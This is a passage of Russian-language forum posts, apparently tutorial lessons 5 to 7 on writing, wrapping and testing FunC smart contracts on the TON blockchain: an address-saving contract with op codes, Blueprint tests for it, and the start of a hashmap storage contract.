int equal_slices (slice a, slice b) asm "SDEQ";
```

Как вы можете видеть, используется ключевое слово `asm`

Посмотреть список возможных примитивов можно в [документации](https://docs.ton.org/learn/tvm-instructions/instructions).

##### [](#h-11)Выгрузить адреса из постоянных данных

Хранить адреса мы будем в слайсах, но исходя из задачи хранить нам предстоит два адреса, адрес Менеджера, для проверки и адрес, который пришлет менеджер для хранения. Поэтому слайсы будем возвращать в кортеже.

Для того чтобы “достать” постоянные данные нам понадобятся две функции из [стандартной библиотеки FunC](https://docs.ton.org/develop/func/stdlib/).

А именно:  
`get_data` - берет ячейку из постоянных данных.  
`begin_parse` - ячейку преобразует в slice

Передадим это значение в переменную ds:

`var ds = get_data().begin_parse()`

Загрузим из сообщения адрес с помощью `load_msg_addr()` - которая загружает из слайса единственный префикс, который является допустимым MsgAddress. У нас их два, так что ‘вычитаем’ два раза.

`return (ds~load_msg_addr(), ds~load_msg_addr());`

Итого получим следующую функцию:

```
(slice, slice) load_data () inline {
  var ds = get_data().begin_parse();
  return (ds~load_msg_addr(), ds~load_msg_addr());
}
```

##### [](#inline-12)Inline

В прошлых уроках мы уже использовали спецификатор `inline`, который фактически подставляет код в каждом месте вызова функции. В этом уроке рассмотрим, зачем это необходимо с практической точки зрения.

Как мы знаем из [документации](https://docs.ton.org/develop/smart-contracts/fees) комиссия за транзакцию состоит из:

*   storage\_fees - комиссия за место в блокчейне.
*   in\_fwd\_fees - комиссия за импорт сообщений(это случай когда обрабатываем `external` messages).
*   computation\_fees - комиссии за выполнение инструкций TVM.
*   action\_fees - комиссии, связанная с обработкой списка действий (например отправка сообщений).
*   out\_fwd\_fees - комиссия за импорт исходящих сообщений.

Подробнее [здесь](https://docs.ton.org/develop/smart-contracts/fees).  
Собственно спецификатор `inline` позволяет сэкономить **computation\_fee**.

По умолчанию, когда у вас есть функция funC, она получает свой собственный идентификатор, хранящийся в отдельном словаре id->function, и когда вы вызываете ее где-то в программе, происходит поиск функции в словаре и последующий переход.

Спецификатор же `inline` помещает тело функции прямо в код родительской функции.

Поэтому если функция используется только один или два раза, часто гораздо дешевле объявить эту функцию `inline`, то есть встроенной, так как переход к ссылке намного дешевле, чем поиск и переход по словарю.

##### [](#h-13)Загрузить адреса в постоянные данные

Конечно же по мимо выгрузки нужна загрузка. Сделаем функцию, которая сохраняет адрес менеджера и адрес который менеджер отправит:

```
() save_data (slice manager_address, slice memorized_address) impure inline {

}
```

Замечу, что фукнция имеет [спецификатор](https://docs.ton.org/develop/func/functions#specifiers) `impure`. И мы должны указать `impure` спецификатор, если функция может изменять хранилище контракта. Иначе компилятор FunC может удалить этот вызов функции.

Для того чтобы “сохранить” постоянные данные нам понадобятся функции из [стандартной библиотеки FunC](https://docs.ton.org/develop/func/stdlib/).

А именно:

`begin_cell()` - создаст Builder для будущей ячейки  
`store_slice()` - cохранит Slice(слайс) в Builder  
`end_cell()` - создат Cell (ячейку)

`set_data()` - запишет ячейку в постоянные данные

Собираем ячейку:

```
begin_cell().store_slice(manager_address).store_slice(memorized_address).end_cell()
```

Загружаем её в постоянные данные контракта:

```
set_data(begin_cell().store_slice(manager_address).store_slice(memorized_address).end_cell());
```

Итого получим следующую функцию:

```
() save_data (slice manager_address, slice memorized_address) impure inline {
	  set_data(begin_cell().store_slice(manager_address).store_slice(memorized_address).end_cell());
}
```

##### [](#h-14)Парсим адрес отправителя из входящего сообщения

Объявим функцию, с помощью который мы сможем достать адрес отправителя из ячейки сообщения. Функция будет возвращать слайс, так как сам адрес мы будем брать с помощью `load_msg_addr()` - которая загружает из слайса единственный префикс, который является допустимым MsgAddress и возвращает его в слайс.

```
slice parse_sender_address (cell in_msg_full) inline {
  return sender_address;
}
```

Теперь используя уже знакомую нам `begin_parse` преобразуем ячейку в слайс.

```
slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  return sender_address;
}
```

Начинаем “вычитывать” ячейку с помощью `load_uint`, функции из [стандартной библиотеки FunC](https://docs.ton.org/develop/func/stdlib/) она загружает целое число n-бит без знака из слайса.

В данном уроке мы не будем останавливаться подробно на флагах, но подробнее можно прочитать [в документации](https://docs.ton.org/develop/smart-contracts/messages#message-layout).  
Ну и наконец берем адрес.

Итого получим следующую функцию:

```
slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}
```

## [](#h-15)Промежуточный итог

На данный момент у нас готовый вспомогательные функции и тело основной функции данного смарт-контракта `recv_internal()`.

```
#include "imports/stdlib.fc";

int equal_slices (slice a, slice b) asm "SDEQ";

(slice, slice) load_data () inline {
  var ds = get_data().begin_parse();
  return (ds~load_msg_addr(), ds~load_msg_addr());
}

() save_data (slice manager_address, slice memorized_address) impure inline {
  set_data(begin_cell().store_slice(manager_address).store_slice(memorized_address).end_cell());
}

slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}

	() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
	 ;; возьмем  op query_id, и адрес отправителя sender_address

	  if (op == 1) {
		;; здесь будем сохранять адрес полученный от менеджера
	  } elseif (op == 2) {
		;; отправка сообщения
	  } else {
		;; здесь будет исключение
	  }
	}
```

Осталось только наполнить `recv_internal()`.

## [](#h-16)Наполняем внешний метод

##### [](#op-query_id-sender_address-17)Берем op query\_id, и адрес отправителя sender\_address

Из тела сообщения считываем op и query\_id соответственно. По [рекомендациям](https://docs.ton.org/develop/smart-contracts/guidelines/internal-messages) это 32 и 64 битные значения.

А также с помощью функции `parse_sender_address()`, которую мы написали выше возьмем адрес отправителя.

```
	() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
	int op = in_msg_body~load_int(32);
	int query_id = in_msg_body~load_uint(64);
	var sender_address = parse_sender_address(in_msg_full);

	  if (op == 1) {
		;; здесь будем сохранять адрес полученный от менеджера
	  } elseif (op == 2) {
		;; отправка сообщения
	  } else {
		;; здесь будет исключение
	  }
	}
```

##### [](#op-1-18)Флаг op == 1

В соответствии с заданием при флаге 1, мы должны получив адреса менеджера и сохраненный адрес, проверить что адрес отправителя равен адресу менеджера(только менеджер может менять адрес) и сохранить новый адрес, который храниться в теле сообщения.

Загрузим из постоянных данных адрес менеджера `manager_address` и сохраненный адрес `memorized_address)` используя функцию `load_data()` написанную ранее.

```
(slice manager_address, slice memorized_address) = load_data();
```

Используя функцию `equal_slices` и унарный оператор `~`, который является побитовым не, проверяем равенство адрес, выдавая исключение если это адреса не равны.

```
(slice manager_address, slice memorized_address) = load_data();
throw_if(1001, ~ equal_slices(manager_address, sender_address));
```

Возьмем адрес, с помощью уже знакомой `load_msg_addr()` и сохраним адреса используя написанную ранее функцию `save_data()`.

```
(slice manager_address, slice memorized_address) = load_data();
throw_if(1001, ~ equal_slices(manager_address, sender_address));
slice new_memorized_address = in_msg_body~load_msg_addr();
save_data(manager_address, new_memorized_address);
```

##### [](#op-2-19)Флаг op == 2

В соответствии с заданием при флаге 2 мы должны отправить сообщением с телом, содержащим:

*   `op` равна 3
*   тот же `query_id`
*   Адрес менеджера
*   Адрес, который был запомнен с момента последнего запроса менеджера (пустой адрес `addr_none`, если еще не было запроса менеджера)
*   Значение TON, прикрепленное к сообщению за вычетом платы за обработку.

Прежде чем отправлять сообщение загрузим адреса, хранящиеся в контракте.

```
 (slice manager_address, slice memorized_address) = load_data();
```

С полной структурой сообщения можно ознакомиться [здесь - message layout](https://docs.ton.org/develop/smart-contracts/messages#message-layout). Но обычно нам нет необходимости контролировать каждое поле, поэтому можно использовать краткую форму из [примера](https://docs.ton.org/develop/smart-contracts/messages):

```
	 var msg = begin_cell()
		.store_uint(0x18, 6)
		.store_slice(addr)
		.store_coins(amount)
		.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
		.store_slice(message_body)
	  .end_cell();
```

Полный разбор сообщений в TON есть в [третьем уроке](https://github.com/romanovichim/TonFunClessons_ru/blob/main/3lesson/thirdlesson.md).

Отправка сообщения в соответствии с условиями:

```
(slice manager_address, slice memorized_address) = load_data();
  var msg = begin_cell()
          .store_uint(0x10, 6)
          .store_slice(sender_address)
          .store_grams(0)
          .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
          .store_uint(3, 32)
          .store_uint(query_id, 64)
          .store_slice(manager_address)
          .store_slice(memorized_address)
        .end_cell();
  send_raw_message(msg, 64);
```

##### [](#h-20)Исключение

Здесь все просто используем обычный `throw` из [встроенных модулей FunC](https://docs.ton.org/develop/func/builtins#throwing-exceptions).

```
throw(3);
```

##Полный код смарт-контракта

```
#include "imports/stdlib.fc";

int equal_slices (slice a, slice b) asm "SDEQ";

(slice, slice) load_data () inline {
    var ds = get_data().begin_parse();
    return (ds~load_msg_addr(), ds~load_msg_addr());
}

() save_data (slice manager_address, slice memorized_address) impure inline {
    set_data(begin_cell().store_slice(manager_address).store_slice(memorized_address).end_cell());
}

slice parse_sender_address (cell in_msg_full) inline {
    var cs = in_msg_full.begin_parse();
    var flags = cs~load_uint(4);
    slice sender_address = cs~load_msg_addr();
    return sender_address;
}

() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
    int op = in_msg_body~load_int(32);
    int query_id = in_msg_body~load_uint(64);
    var sender_address = parse_sender_address(in_msg_full);

    if (op == 1) {
        (slice manager_address, slice memorized_address) = load_data();
        throw_if(1001, ~ equal_slices(manager_address, sender_address));
        slice new_memorized_address = in_msg_body~load_msg_addr();
        save_data(manager_address, new_memorized_address);
    } elseif (op == 2) {
        (slice manager_address, slice memorized_address) = load_data();
        var msg = begin_cell()
            .store_uint(0x10, 6)
            .store_slice(sender_address)
            .store_grams(0)
            .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
            .store_uint(3, 32)
            .store_uint(query_id, 64)
            .store_slice(manager_address)
            .store_slice(memorized_address)
        .end_cell();
        send_raw_message(msg, 64);
    } else {
        throw(3);
    }
}
```

## [](#typescript-21)Обёртка на TypeScript

Для удобного взаимодействия с нашим смарт-контрактом, напишем обёртку на TypeScript. База для неё уже предоставляется от Blueprint.

### [](#h-22)Конфиг данных контракта

Откроем файл `wrappers/AddressSaver.ts` (название файла может быть другим, смотря как вы создавали проект).  
Начнём с изменений в конфиге данных. Наш контракт содержит в свои данных два значения - адрес менеджера и сохранённый адрес. Пусть сохранённый адрес по умолчанию будет пустым (пустой адрес можно записать как два нуля, то есть uint2 с значением 0). Добавим эти значения в конфиг:

```
export type AddressSaverConfig = {
    manager: Address;
};

export function addressSaverConfigToCell(config: AddressSaverConfig): Cell {
    return beginCell().storeAddress(config.manager).storeUint(0, 2).endCell();
}
```

Теперь перейдём к классу `AddressSaver` чтобы добавить методы для вызова нужных нам операций.

### [](#op-1-23)Метод для вызова op = 1

При вызове операции с кодом 1, в тело сообщения мы должны положить: op=1, query\_id, а также новый адрес, который мы хотим сохранить в контракте. Назовём метод `sendChangeAddress` (напомню, что методы, которые посылают сообщения на контракт, обязательно должны иметь префикс `send`).

```
async sendChangeAddress(provider: ContractProvider, via: Sender, value: bigint, queryId: bigint, newAddress: Address) {
    await provider.internal(via, {
        value,
        sendMode: SendMode.PAY_GAS_SEPARATELY,
        body: beginCell().storeUint(1, 32).storeUint(queryId, 64).storeAddress(newAddress).endCell(),
    });
}
```

### [](#op-2-24)Метод для вызова op = 2

Эта операция не требует дополнительных данных кроме op=2 и query\_id. Назовём метод `sendRequestAddress`.

```
async sendRequestAddress(provider: ContractProvider, via: Sender, value: bigint, queryId: bigint) {
    await provider.internal(via, {
        value,
        sendMode: SendMode.PAY_GAS_SEPARATELY,
        body: beginCell().storeUint(2, 32).storeUint(queryId, 64).endCell(),
    });
}
```

## [](#h-25)Заключение

Тесты мы напишем в следующем уроке. Плюс хотел сказать отдельное спасибо, тем кто донатит TON для поддержки проекта, это очень мотивирует и помогает выпускать уроки быстрее.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/5lesson/fifthlesson.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/smartcontract/5lesson/fifthlesson.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/5lesson/fifthlesson.md)

```
# Урок 5 Запоминаем Адрес и идентифицируем операцию

## Введение

В этом уроке мы напишем смарт-контракт, который умеет производить разные операции в зависимости от флага, в блокчейне TON на языке FunC, а протестируем его уже в следующем уроке.

## Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например 18.

А также уметь создавать/деплоить проект с помощью Blueprint. Научиться этому можно в [первом уроке](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## Op - для идентификации операции

Прежде чем рассматривать что за смарт-контракт мы будем делать в этом уроке, предлагаю изучить [рекомендации](https://docs.ton.org/develop/smart-contracts/guidelines/internal-messages) о теле сообщения смарт-контракта (`message body`).

Чтобы мы могли создавать подобие клиент-серверной архитектуры на смарт-контрактах, рекомендуется начинать каждое сообщение (строго говоря тело сообщения) с некоторого 32-битного флага `op`, который будет идентифицировать какую операцию должен выполнить смарт-контракт. Сам контракт в свою очередь, на основе значения этого флага, должен выполнить нужную операцию, и при необходимости отправить ответное сообщение, которое также будет включать в себя какой-то `op`.

В этом уроке мы будем делать смарт-контракт, который выполняет различные действия в зависимости от `op`.

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/5lesson/fifthlesson.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 462

[TON Research](/)

# [Пишем смарт-контракты на FunC - Урок 6 Тестируем флаги и хранение данных в контракте](/t/func-6/462)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[func](https://tonresear.ch/tag/func), [learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:42pm  1

# [](#h-6-func-op-query_id-1)Урок 6 Тесты на FunC для смарт-контракта с op и query\_id

## [](#h-2)Введение

В этом уроке мы напишем тесты для смарт-контракта созданного в пятом уроке в блокчейне TON и выполним их с помощью [Blueprint](https://github.com/ton-community/blueprint).

## [](#h-3)Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например 18.

А также пройти [пятый урок](https://github.com/romanovichim/TonFunClessons_ru/blob/main/5lesson/fifthlesson.md).

## [](#h-4)Задание пятого урока

Для удобства напомню здесь, что мы делали в пятом уроке. Задача смарт-контракта будет запоминать адрес, устанавливаемый менеджером и сообщать его всем, кто запросит, в частности следующая функциональность\*\*:

*   когда контракт получает сообщение от Менеджера с `op` равным 1  
    за которым следует какой-то `query_id`, за которым следует `MsgAddress`, он должен сохранить полученный адрес в хранилище.
*   когда контракт получает внутреннее сообщение с любого адреса с `op`, равным 2, за которым следует `query_id`, он должен ответить отправителю сообщением с телом, содержащим:
    *   `op` равна 3
    *   тот же `query_id`
    *   Адрес менеджера
    *   Адрес, который был запомнен с момента последнего запроса менеджера (пустой адрес `addr_none`, если еще не было запроса менеджера)
    *   Значение TON, прикрепленное к сообщению за вычетом платы за обработку.
*   когда смарт-контракт получает любое другое сообщение, он должен выдать исключение.

## [](#te-op-query_id-5)Teсты для смарт-контракта с op и query\_id

Для нашего прокси смарт-контракта мы напишем следующие тесты:

*   Сохранение адресов с op = 1
*   Адрес должен иметь возможность сохранять только менеджер
*   Обработка op = 2
*   Контракт должен выдавать исключение при любом другом опкоде

### [](#h-6)Прежде чем перейти к написанию тестов…

Откроем файл `tests/AddressSaver.spec.ts` (название может отличаться, если вы назвали проект по-другому), в котором будут наши тесты. Вспомним из четвёртого урока, что нужно обновить значения в конфиге при деплое на те, которые мы там задавали. Также для удобства можно вынести объявление объекта `deployer` за пределы функции `beforeEach` чтобы иметь к нему доступ из всех тестов.

### [](#op-1-7)Тестируем op = 1

Генерируем случайный адрес функцией `randomAddress()`, а затем вызываем метод `sendChangeAddress` от имени кошелька `deployer`.

В таком случае, должна присутствовать транзакция от `deployer` к `AddressSaver` с флагом `success = true` (который означает, что выполнение всех фаз транзакции было успешно).

```
it('should change saved address by manager', async () => {
    const address = randomAddress();
    const result = await addressSaver.sendChangeAddress(
        deployer.getSender(),
        toNano('0.01'),
        12345n,
        address
    );

    expect(result.transactions).toHaveTransaction({
        from: deployer.address,
        to: addressSaver.address,
        success: true,
    });
});
```

### [](#op-1-8)Тестируем исключение при вызове op = 1 не менеджером

В этом тесте делаем то же самое что и в предыдущем, но вызываем `sendChangeAddress` от имени другого кошелька `user`.

В таком случае флаг `success` должен быть `false`.

```
it('should not change saved address by anyone else', async () => {
    let user = await blockchain.treasury('user');
    const address = randomAddress();
    const result = await addressSaver.sendChangeAddress(
        user.getSender(),
        toNano('0.01'),
        12345n,
        address
    );

    expect(result.transactions).toHaveTransaction({
        from: user.address,
        to: addressSaver.address,
        success: false,
    });
});
```

### [](#op-2-9)Тестируем op = 2

Вызываем `sendChangeAddress` как и в первом тесте чтобы успешно поменять сохранённый адрес. Затем используя новый кошелёк `user` вызываем `sendRequestAddress`.

Такой вызов должен спровоцировать транзакцию от `AddressSaver` к `user` с телом сообщения, которое содержит в себе op = 3, query\_id = 12345, deployer.address, address.

```
it('should return required data on `requestAddress` call', async () => {
    const address = randomAddress();
    await addressSaver.sendChangeAddress(
        deployer.getSender(),
        toNano('0.01'),
        12345n,
        address
    );

    let user = await blockchain.treasury('user');
    const result = await addressSaver.sendRequestAddress(
        user.getSender(),
        toNano('0.01'),
        12345n
    );
    expect(result.transactions).toHaveTransaction({
        from: addressSaver.address,
        to: user.address,
        body: beginCell()
            .storeUint(3, 32)
            .storeUint(12345n, 64)
            .storeAddress(deployer.address)
            .storeAddress(address)
            .endCell(),
    });
});
```

### [](#h-10)Тестируем исключение при любых других опкодах

Для этого теста будем использовать метод `send` у контракта `Treasury`. Отправим, например, сообщение с op = 5.

Такая транзакция должна завершиться с `exitCode = 3`, что мы и проверяем в тесте.

```
it('should throw on any other opcode', async () => {
    const result = await deployer.send({
        to: addressSaver.address,
        value: toNano('0.01'),
        body: beginCell().storeUint(5, 32).storeUint(12345n, 64).endCell(),
    });
    expect(result.transactions).toHaveTransaction({
        from: deployer.address,
        to: addressSaver.address,
        exitCode: 3,
    });
});
```

Запустим тесты командой `npx blueprint test` и мы должны увидеть следующее:

```
 PASS  tests/AddressSaver.spec.ts
  AddressSaver
    ✓ should deploy (145 ms)
    ✓ should change saved address by manager (67 ms)
    ✓ should not change saved address by anyone else (67 ms)
    ✓ should return required data on `requestAddress` call (70 ms)
    ✓ should throw on any other opcode (89 ms)
```

Если какие то тесты у вас не прошли, просмотрите код и текст этого урока ещё раз. Также сверьте свой код смарт-контракта с кодом из предыдущего урока.

## [](#h-11)Заключение

Хотел сказать отдельное спасибо, тем кто донатит для поддержки проекта, это очень мотивирует и помогает выпускать уроки быстрее. Если вы хотите помочь проекту (быстрее выпускать уроки, перевести это все на английский итд), внизу на [главной странице](https://github.com/romanovichim/TonFunClessons_ru), есть адреса для донатов.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/6lesson/sixthlesson.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/smartcontract/6lesson/sixthlesson.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/6lesson/sixthlesson.md)

```
# Урок 6 Тесты на FunC для смарт-контракта с op и query_id

## Введение

В этом уроке мы напишем тесты для смарт-контракта созданного в пятом уроке в блокчейне TON и выполним их с помощью [Blueprint](https://github.com/ton-community/blueprint).

## Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например 18.

А также пройти [пятый урок](https://github.com/romanovichim/TonFunClessons_ru/blob/main/5lesson/fifthlesson.md).

## Задание пятого урока

Для удобства напомню здесь, что мы делали в пятом уроке. Задача смарт-контракта будет запоминать адрес, устанавливаемый менеджером и сообщать его всем, кто запросит, в частности следующая функциональность\*\*:

-   когда контракт получает сообщение от Менеджера с `op` равным 1
    за которым следует какой-то `query_id`, за которым следует `MsgAddress`, он должен сохранить полученный адрес в хранилище.
-   когда контракт получает внутреннее сообщение с любого адреса с `op`, равным 2, за которым следует `query_id`, он должен ответить отправителю сообщением с телом, содержащим:
    -   `op` равна 3
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/6lesson/sixthlesson.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 463

[TON Research](/)

# [Пишем смарт-контракты на FunC - Урок 7 HashMap хранилище](/t/func-7-hashmap/463)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[func](https://tonresear.ch/tag/func), [learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:43pm  1

# [](#h-7-hashmap-1)Урок 7 Hashmap или Словарь

## [](#h-2)Введение

В этом уроке мы напишем смарт-контракт, который умеет производить разные операции с Hashmap - словарем, в блокчейне TON на языке FunC, а протестируем его уже в следующем уроке.

## [](#h-3)Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например 18.

А также уметь создавать/деплоить проект с помощью Blueprint. Научиться этому можно в [первом уроке](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## [](#hashmap-or-dictionaries-4)Hashmap or dictionaries (словари)

Hashmap - это структура данных представленная деревом. Hashmap - отображает ключи, в значения произвольного типа, таким образом, чтобы был возможен быстрый поиск и модификация. В FunC hashmaps [представлены ячейкой](https://docs.ton.org/develop/func/stdlib/#dictionaries-primitives).

## [](#h-5)Смарт-контракт

Задача смарт-контракта будет добавлять и удалять данные и key/value хранилища Hashmap в частности следующая функциональность\*\*:

*   Смарт-контракт при получении сообщения со структурой описанной ниже контракт должен добавить к своим данным новую запись типа ключ/значение:
    *   32-bit unsigined `op` равный 1
        *   64-bit unsigned `query_id`
        *   256-bit unsigned key
        *   64-bit `valid_until` unixtime
        *   оставшийся слайс значение
*   Сообщение об удалении устаревших данных имеет следующую структуру: - 32-bit unsigined `op` equal to 2 - 64-bit unsigned `query_id`  
    При получении такого сообщения контракт должен удалить из своих данных все устаревшие записи (с `valid_until` < now()). А так же проверить, что в сообщение нет лишних данных кроме 32-bit unsigined `op` и 64-bit unsigned `query_id`
*   Для всех других внутренних сообщений должна быть выдана ошибка
*   Должен быть реализован Get-метод `get_key` который принимает 256-битный ключ без знака и должен возвращать целое число `valid_until` и значение слайса данных для этого ключа. Если для этого ключа нет записи, должна быть выдана ошибка.
*   Важно! мы предполагаем, что контракт начинает работу с пустым хранилищем.

\*\* идеи для смарт-контрактов я решил брать из задач [FunC contest1](https://github.com/ton-blockchain/func-contest1), так как они очень хорошо подходят для ознакомления с разработкой смарт-контрактов для TON.

## [](#h-6)Внешний метод

## [](#h-7)Структура внешнего метода

Для того, чтобы наша прокси могла принимать сообщения будем использовать внешний метод`recv_internal()`

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

##### [](#h-8)Берем данные из тела сообщения

По условию в зависимости от `op` контракт должен работать по-разному. Поэтому вычитаем `op` и `query_id` из тела сообщения.

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
	int op = in_msg_body~load_uint(32);
	int query_id = in_msg_body~load_uint(64);
 }
```

Подробнее про `op` и `query_id` можно почитать в [пятом уроке](https://github.com/romanovichim/TonFunClessons_ru/blob/main/5lesson/fifthlesson.md).

Также используя условные операторы выстраиваем логику вокруг `op`

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
	int op = in_msg_body~load_uint(32);
	int query_id = in_msg_body~load_uint(64);

	if (op == 1) {
	;; здесь будем добавлять новые значения
	}
	if (op == 2) {
	;; здесь удалять
	}
 }
```

По заданию для всех других внутренних сообщений должна быть выдана ошибка, поэтому добавим исключение после условных операторов.

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
	int op = in_msg_body~load_uint(32);
	int query_id = in_msg_body~load_uint(64);

	if (op == 1) {
	;; здесь будем добавлять новые значения
	}
	if (op == 2) {
	;; здесь удалять
	}
	throw (1001);
 }
```

Теперь надо взять постоянные данные контракта. Понадобятся две функции из [стандартной библиотеки FunC](https://docs.ton.org/develop/func/stdlib/).

А именно:  
`get_data` - берет ячейку постоянных данных.  
`begin_parse` - ячейку преобразует в slice

Передадим это значение в слайс ds

```
cell data = get_data();
slice ds = data.begin_parse();
```

важно учесть замечание в задании, что контракт будет начинать работу с пустыми данными. Поэтому, чтобы корректно проинициализировать эти переменные, воспользуемся условным оператором, синтаксис следующий:

```
<condition> ? <consequence> : <alternative>
```

Выглядеть это будет так:

```
cell dic = ds.slice_bits() == 0 ? new_dict() : data;
```

Здесь используются следующие функции из стандартной библиотеки FunC:

*   `slice_bits()` - возвращает количество битов данных в слайсе, проверяем пустые данные контракта или нет
*   `new_dict()` \- создает пустой словарь, который на самом деле является нулевым значением. Частный случай null().

Итого каркас контракта следующий:

```
#include "imports/stdlib.fc";

() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
	int op = in_msg_body~load_uint(32);
	int query_id = in_msg_body~load_uint(64);

	cell data = get_data();
	slice ds = data.begin_parse();
	cell dic = ds.slice_bits() == 0 ? new_dict() : data;
	if (op == 1) {
	;; здесь будем добавлять новые значения
	}
	if (op == 2) {
	;; здесь удалять
	}
	throw (1001);
 }
```

# [](#op-1-9)op = 1

При `op` равному одному мы добавляем значение в hashmap. Соответственно по заданию нам надо:

*   достать ключ из тела сообщения
*   установить значение в hashmap(словарь) используя ключ и тело сообщения
*   сохранить hashmap(словарь)
*   завершает выполнение функции, чтобы мы не попали на исключение объявленное в конце recv\_internal()

##### [](#h-10)Достаем ключ

Здесь все как и раньше, используем `load_uint` функцию из [стандартной библиотеки FunC](https://docs.ton.org/develop/func/stdlib/) она загружает целое число n-бит без знака из слайса.

```
	if (op == 1) {
		int key = in_msg_body~load_uint(256);
	}
```

##### [](#hashmap-11)Работаем с hashmap

Для добавления данных воспользуемся `dict_set` которая устанавливает значение, связанное с индексом ключа key n битность в словаре dict, в слайс и возвращает результирующий словарь.

```
if (op == 1) { ;; add new entry
	int key = in_msg_body~load_uint(256);
	dic~udict_set(256, key, in_msg_body);

}
```

##### [](#h-12)Сохраняем словарь

С помощью функции `set_data()` - запишем ячейку с hashmap постоянные данные.

```
if (op == 1) { ;; add new entry
	int key = in_msg_body~load_uint(256);
	dic~udict_set(256, key, in_msg_body);
	set_data(dic);

}
```

##### [](#h-13)Завершаем выполнение функции

Здесь все просто, оператор `return` нам в помощь.

```
if (op == 1) { ;; add new entry
	int key = in_msg_body~load_uint(256);
	dic~udict_set(256, key, in_msg_body);
	set_data(dic);
	return ();
}
```

# [](#op-2-14)op = 2

Здесь наша задача удалить из своих данных все устаревшие записи (с `valid_until` < `now()`). Для того, чтобы “пройти” по hashmap будем использовать цикл. В FunC есть три [цикла](https://docs.ton.org/develop/func/statements#loops): `repeat`,`until`,`while`.

Так как мы уже вычитали `op` и `query_id`, проверим здесь, что в слайсе in\_msg\_body ничего нет с помощью `end_parse()`

`end_parse()` - Проверяет, является ли слайс пустым. Если нет, выдает исключение

```
if (op == 2) {
	in_msg_body.end_parse();
}
```

Для нашего случая воспользуемся циклом: `until`.

```
if (op == 2) {
	do {

	} until ();
}
```

Чтобы на каждом шаге проверять условие `valid_until` < `now())`, нам необходимо получать некий минимальный ключ нашего hashmap. Для этого в [стандартной библиотеке FunC](https://docs.ton.org/develop/func/stdlib/#dict_set) есть функция `udict_get_next?`.

`udict_get_next?` \- вычисляет минимальный ключ k в dict словаря, который больше, чем некоторое заданное значение, и возвращает k, связанное значение и флаг, указывающий на успех. Если словарь пуст, возвращает (null, null, 0).

Соответственно зададим перед циклом значение от, которого будем брать минимальный ключ, а в самом цикле будем использовать флаг, указывающий на успех.

```
if (op == 2) {
	int key = -1;
	do {
		(key, slice cs, int f) = dic.udict_get_next?(256, key);

	} until (~ f);
}
```

Теперь с помощью условного оператора будем проверять условие `valid_until` < `now())`. Значение `valid_until` вычитаем из `slice cs`.

```
if (op == 2) {
	int key = -1;
	do {
		(key, slice cs, int f) = dic.udict_get_next?(256, key);
		if (f) {
			int valid_until = cs~load_uint(64);
			if (valid_until < now()) {
					;; здесь будем удалять
			}
		}
	} until (~ f);
}
```

Удалять из hashmap будем используя `udict_delete?`.

`udict_delete?` - удаляет индекс с ключом k из словаря dict. Если ключ присутствует, возвращает модифицированный словарь (hashmap) и флаг успеха -1. В противном случае возвращает исходный словарь dict и 0.

Получаем:

```
if (op == 2) {
	int key = -1;
	do {
		(key, slice cs, int f) = dic.udict_get_next?(256, key);
		if (f) {
			int valid_until = cs~load_uint(64);
			if (valid_until < now()) {
				dic~udict_delete?(256, key);
			}
		}
	} until (~ f);

}
```

##### [](#h-15)Сохраняем словарь

Используя `dict_empty?` проверим стал ли пустым hashmap после наших манипуляций в цикле.

Если значения есть, сохраняем в постоянные данные наш hashmap. Если нет, то положим туда пустую ячейку, с помощью комбинации функций `begin_cell().end_cell()`

```
if (dic.dict_empty?()) {
		set_data(begin_cell().end_cell());
	} else {
		set_data(dic);
	}
```

##### [](#h-16)Завершаем выполнение функции

